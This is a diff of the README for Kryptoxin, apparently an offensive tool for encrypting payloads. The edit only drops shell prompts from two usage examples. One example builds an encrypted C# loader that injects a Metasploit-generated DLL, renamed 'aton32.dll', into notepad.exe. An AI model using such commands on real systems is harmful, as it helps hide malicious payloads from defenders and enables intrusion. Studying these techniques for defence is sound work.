@@ -13,7 +13,7 @@ All templates shipped with Kryptoxin can be directly pasted into [Visual Studio]
 This basic console program simply prints the UTF-8 encoded text encrypted by Kryptoxin. It uses the `System.Security.Cryptography` .NET class, which is widely supported by current Windows hosts.
 
 ``` sh
-$ python -m kryptoxin encrypt -k s3cret --random-iv --random-salt \
+python -m kryptoxin encrypt -k s3cret --random-iv --random-salt \
 --alg AES --key_size 192 --iter 5000 --lang csharp --action print
 ```
 
@@ -51,7 +51,7 @@ EXITFUNC=thread -f dll -o msf.dll
 ```
 
 ``` sh
-$ python -m kryptoxin encrypt -k 123456 --random-iv --random-salt \
+python -m kryptoxin encrypt -k 123456 --random-iv --random-salt \
 --lang csharp --action load-dll --in msf.dll --dllname=aton32.dll \
 --process=notepad.exe
 ```
